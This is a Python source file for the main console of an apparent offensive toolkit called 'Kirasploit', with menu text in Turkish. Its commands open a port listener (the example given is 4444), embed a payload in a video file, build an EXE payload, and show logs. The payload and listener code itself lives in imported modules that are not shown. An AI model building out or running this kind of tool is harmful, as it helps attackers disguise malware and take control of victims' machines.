from utils.ascii_art import banner
from modules.listener import start_listener
from modules.payload_video import create_video_payload
from modules.payload_exe import create_exe_payload
from modules.logger import get_logs

def help_menu():
    print("""
Kirasploit Komutları:
- listener [port]        : Port dinleyici açar
- payload_video          : Video içine payload gömer
- payload_exe            : EXE payload oluşturur
- logs                   : Logları gösterir
- help                   : Komutları gösterir
- exit                   : Çıkış yapar
""")

def main():
    banner()
    while True:
        cmd = input("kiraconsole> ").strip()
        if cmd == "":
            continue
        parts = cmd.split()
        command = parts[0].lower()

        if command == 'exit':
            print("Çıkış yapılıyor...")
            break
        elif command == 'help':
            help_menu()
        elif command == 'listener':
            if len(parts) < 2:
                print("Lütfen port numarası girin. Örnek: listener 4444")
                continue
            try:
                port = int(parts[1])
                start_listener(port)
            except:
                print("Geçersiz port numarası.")
        elif command == 'payload_video':
            create_video_payload()
        elif command == 'payload_exe':
            create_exe_payload()
        elif command == 'logs':
            logs = get_logs()
            if logs:
                print("\n".join(logs))
            else:
                print("Log bulunamadı.")
        else:
            print("Bilinmeyen komut. Yardım için 'help' yazın.")

if __name__ == "__main__":
    main()
